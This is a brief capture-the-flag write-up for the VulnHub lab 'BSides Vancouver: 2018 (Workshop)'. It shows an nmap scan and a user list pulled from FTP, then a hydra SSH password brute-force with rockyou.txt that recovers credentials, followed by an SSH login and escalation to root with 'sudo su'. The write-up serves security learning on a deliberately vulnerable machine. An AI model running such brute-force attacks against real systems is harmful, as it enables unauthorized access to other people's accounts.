<h1> BSides Vancouver: 2018 (Workshop) Write-up</h1>

<h2>NMAP</h2>

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
```

Found **"users.txt.bk"** from ftp:

users :

```
abatchy
john
mai
anne
doomguy
```

<h4>SSH BRUTE FORCE</h4>

```
hydra -L users.txt.bk -P rockyou.txt 192.168.56.36 ssh 

username : anne
password : princess
ssh anne@192.168.56.36
```
<h2>Privilege Escalation</h2>

sudo su 

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/BSides%20Vancouver%3A%202018%20(Workshop)/image/flag.png)
